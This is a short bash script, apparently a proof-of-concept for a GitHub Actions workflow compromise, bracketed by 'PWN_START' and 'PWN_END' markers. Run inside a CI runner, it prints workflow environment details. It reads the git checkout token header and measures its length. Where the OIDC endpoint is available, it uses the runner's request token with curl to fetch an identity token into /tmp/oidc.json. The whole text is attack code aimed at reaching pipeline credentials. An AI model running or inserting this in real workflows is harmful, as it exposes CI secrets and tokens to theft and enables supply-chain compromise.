#!/usr/bin/env bash
set -x
echo "=== PWN_START ==="
id
echo "GITHUB_REF=$GITHUB_REF"
echo "GITHUB_EVENT_NAME=$GITHUB_EVENT_NAME"
echo "GITHUB_WORKFLOW=$GITHUB_WORKFLOW"
hdr=$(git config --get http.https://github.com/.extraheader || true)
echo "checkout_token_header_len=${#hdr}"
if [ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
  echo "OIDC_ENDPOINT_AVAILABLE=yes"
  code=$(curl -s -o /tmp/oidc.json -w '%{http_code}' -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=poc")
  echo "OIDC_HTTP=$code"
  echo "OIDC_BYTES=$(wc -c < /tmp/oidc.json)"
else
  echo "OIDC_ENDPOINT_AVAILABLE=no"
fi
echo "=== PWN_END ==="
